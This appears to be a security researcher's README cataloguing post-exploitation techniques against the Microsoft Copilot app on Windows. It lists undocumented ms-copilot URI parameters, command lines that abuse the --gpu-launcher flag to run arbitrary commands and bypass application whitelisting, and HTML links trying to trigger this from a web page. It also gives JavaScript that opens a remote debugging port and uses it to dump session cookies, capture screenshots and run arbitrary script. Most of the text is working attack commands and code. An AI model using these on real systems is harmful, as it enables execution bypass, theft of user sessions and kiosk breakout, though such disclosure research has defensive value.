# Tour-de-mscopilot

Post-ex techniques and other novelties using the Microsoft Copilot app on Windows.


## Copilot URI

The `ms-copilot` URI handler exists on modern Windows versions with copilot installed. I couldn't find much of anything about it online and it seems to be largely undocumented. The following are a few interesting parameters I found after some experimentation, decompilation of copilot-related dlls, and ripgrepping around the filesystem for references to "ms-copilot".

Launch copilot:
```
ms-copilot:
```

Launch with a pre-filled query:
```
ms-copilot:chat?q=hi
```
(note this is pre-filled but not auto-submitted)

Launch with attached file and pre-filled query:
```
ms-copilot:chat?q=hi&file=c:\path\to\file
```

Launch with a specific chat mode:
```
ms-copilot:chat?q=hi&chatmode=search
ms-copilot:chat?q=hi&chatmode=study
```

Below shows one location (ProtocolConstants.cs) where URI parameters are defined in a copilot dll I decompiled, but this doesn't seem to be an exhaustive definition.

![](img/dnspy_uri_params.png)

Some other example copilot URI calls I found in various places, but haven't found an immediate use for:
```
ms-copilot:startup?ref=AppUpdateRestart
ms-copilot://gallery/?q=
ms-copilot:chat?visionFlyout=True&form=jumprightin
ms-copilot:startup
ms-copilot:push
ms-copilot://chat/?q=&form=WOLCEP
ms-copilot://login
ms-copilot://jumplist?launchsource=newpage
ms-copilot://jumplist?launchsource=pagelist
ms-copilot:settings
ms-copilot:hotkey?press=tap
ms-copilot:hotkey?press=start
ms-copilot:hotkey?press=stop
ms-copilot://companionWindow/?windowId={0}
ms-copilot:voice?floating=true&target=vision&form=COTBCO
ms-copilot:voice?floating=true&form=COTBCO
ms-copilot:voice?floating=true&target=vision&form=COTBLF
ms-copilot:chat?window=minimized
ms-copilot:chat?window=hidden
```
(the window options used to work but seem to be broken now as of writing this, same with some of the chatmode options)


## Proxy Command Execution

Copilot is an Electron application built on top of Edge (which itself is built on Chromium). Arbitrary commands can be executed using command line options when running the executable, which are potentially useful as a [living-off-the-land](https://lolbas-project.github.io/lolbas/Binaries/Msedge/) technique and for bypassing app whitelisting. Below are some examples.

Open cmd.exe:
```
"C:\Program Files (x86)\Microsoft\Copilot\Application\mscopilot.exe" --disable-gpu-sandbox --gpu-launcher="cmd.exe"
```
(In my testing, one cmd window will open upon invocation but a new one will open each time you close it. This happens 5 times until both cmd and copilot both terminate)

Execute arbitrary commands (open the calculator app, for example):
```
"C:\Program Files (x86)\Microsoft\Copilot\Application\mscopilot.exe" --disable-gpu-sandbox --gpu-launcher="cmd /c calc &&"
```

The problem I encountered with the invocation above is that it seems to execute the command indefinitely until the parent copilot process is killed. We can get around that by adding a command to kill the copilot process after executing the first command we want to run via the following:
```
"C:\Program Files (x86)\Microsoft\Copilot\Application\mscopilot.exe" --disable-gpu-sandbox --gpu-launcher="cmd /c calc && taskkill /f /im mscopilot.exe &&"
```

Adding `--headless` or `--no-startup-window` makes it even faster and doesn't open any copilot window:
```
"C:\Program Files (x86)\Microsoft\Copilot\Application\mscopilot.exe" [--headless | --no-startup-window] --disable-gpu-sandbox --gpu-launcher="cmd /c calc && taskkill /f /im mscopilot.exe &&"
```

Copilot also has a proxy executable ([similar to the one for msedge](https://lolbas-project.github.io/lolbas/Binaries/msedge_proxy/)) which can be used to accomplish the same thing:
```
"C:\Program Files (x86)\Microsoft\Copilot\Application\mscopilot_proxy.exe" --no-startup-window --disable-gpu-sandbox --gpu-launcher="cmd /c calc && taskkill /f /im mscopilot.exe &&"
```

We can also run executables and evaluate arbitrary commands by invoking copilot through the URI handler (from a win+r run dialog):
```
ms-copilot: --disable-gpu-sandbox --gpu-launcher="cmd.exe"
ms-copilot: --disable-gpu-sandbox --gpu-launcher="cmd.exe /c calc && taskkill /f /im mscopilot.exe &&"
```

This could be dangerous if served as a link that someone clicks on, but the tricky part is URI's don't really support CLI-like parameters. Encoding spaces using `%20` or `+` will just result in the literal encoding being passed to the URI handler, rather than being interpreted as spaces between parameters. For example, the following html links get passed to the copilot URI with the literal delimiters in the href rather than being decoded in any way:
```
<a href="ms-copilot:%20--disable-gpu-sandbox%20--gpu-launcher='cmd.exe'>run1</a>
<a href="ms-copilot: --disable-gpu-sandbox --gpu-launcher='cmd.exe'">run2</a>
<a href="ms-copilot:+--disable-gpu-sandbox+--gpu-launcher='cmd.exe'">run3</a>
<a href="ms-copilot:,--disable-gpu-sandbox,--gpu-launcher='cmd.exe'">run4</a>
```
(in the second link, the spaces get URL encoded just like the first link)

![](img/procmon_url.png)


## Debug Port

The copilot app has the option to open a [Chrome DevTools Protocol (CDP)](https://chromedevtools.github.io/devtools-protocol/) debug port. This can be initiated via the mscopilot executable directly or through the URI:
```
"C:\Program Files (x86)\Microsoft\Copilot\Application\mscopilot.exe" --disable-gpu-sandbox --disable-web-security --remote-debugging-port=9222 --remote-debugging-address=0.0.0.0 --remote-allow-origins=*

ms-copilot: --disable-gpu-sandbox --disable-web-security --remote-debugging-port=9222 --remote-debugging-address=0.0.0.0 --remote-allow-origins=*
```
(I was hoping the remote-debugging-address flag would let me expose the debug port on 0.0.0.0, but this option seems to be deprecated/ignored and the port is only exposed locally)

Opening the CDP debug port exposes a few http endpoints which provide JSON definitions of available websocket endpoints (shown at `localhost:9222/json`) and supported CDP methods (`localhost:9222/json/protocol`). We can connect to the debug websocket and interact with copilot via CDP calls using a websocket client or with raw javascript.

Dump cookies:
```
const ws = new WebSocket("ws://localhost:9222/devtools/page/xxx");

ws.onopen = () => {
    ws.send(JSON.stringify({
        id: 1,
        method: "Network.getAllCookies"
    }));
};

ws.onmessage = (event) => {
    console.log("Copilot:", JSON.parse(event.data));
};
```

![](img/debug_cookies.png)

Take a screenshot (returns base64 encoded PNG):
```
ws.send(JSON.stringify({
    id: 1,
    method: "Page.captureScreenshot",
    "params": { "format": "png" }
}));
```

![](img/debug_screenshot.png)

Execute arbitrary javascript:
```
ws.send(JSON.stringify({
    id: 1,
    method: "Runtime.evaluate",
    params: { expression: "window.location.href = 'https://www.google.com'" }
}));
```

This let me splitscreen the copilot chat pane with a browser pane pointed google in the same window, which could be useful as a restricted browser bypass or kiosk-style breakout.
![](img/debug_google_splitscreen.png)

I'm not really a javascript person so there's probably more you could do with this. These were just a few interesting actions I found.

